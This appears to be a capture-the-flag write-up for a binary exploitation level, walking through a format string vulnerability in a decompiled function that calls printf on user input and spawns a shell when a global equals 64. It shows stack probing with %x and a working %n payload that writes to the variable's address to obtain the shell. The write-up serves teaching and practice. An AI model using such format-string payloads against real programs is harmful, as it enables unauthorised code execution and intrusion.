By having a look inside the binary with Ghidra, we notice it has a main function which calls v().

```C
void v(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}
```

0x40 is the hexadecimal notation for 64, and **this global variable m must be equal to this value in order to pass this level.**
We can use gdb and set manually the eax register to 64, but unfortunately we don't have permissions to do anything related to level4, and as such  the flag cannot be displayed.

Looking back at the binary, we only have 3 hints:
- the buffer of 520 characters
- fgets, but by reading the manual the function is protected from buffer overflows.
- printf, which seems possible to be exploited. printf(value) alone is also dangereous to use, and is prone to vulnerabilities.

The attack is called **format string vulnerability**, it means that the input passed can be exploited to leak specific data.
In printf manual, there is an interesting option:

```
n	Nothing printed. The corresponding argument must be a pointer to a signed int. The number of characters written so far is stored in the pointed location.
```

So what if we could use this to **set the value 64 into the m variable?**
With Ghidra I search for the address of m: 

```
0804988c  m
```

We need one more information, that is **where our format string starts on the stack.** Otherwise, the function is unable to assign the variable because it needs to know **the location in the stack,** and will segfault.
To find this location, we ask print to **read the stack argument by argument:**

```
python -c 'print("AAAA " + "%x " * 20)' | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a20 
```
AAAA is the output of the print, but the more interesting part is the 41414141, the hexadecimal notation for AAAA. Our buffer in the stack is thus **displayed on the 4th argument.**

Now we are able to exploit this level:
```
python -c 'print("\x8c\x98\x04\x08" + "%60x%4$n")' > /var/crash/attack
cat /var/crash/attack - | ./level3
�                                                         200
Wait what?!
```

The command means:
- print interprets the input as arguments
- `\x8c\x98\x04\x08` is the address of m in little-endian
- `%x` displays a number in hexadecimal. Since we have the address of m, which is 4 bytes, we are left with 64 - 4 = 60 bytes to write
- `4$` means the fourth position / argument
- `%n` will assign to the pointer the number of character written so far, so 4 + 60 = 64 bytes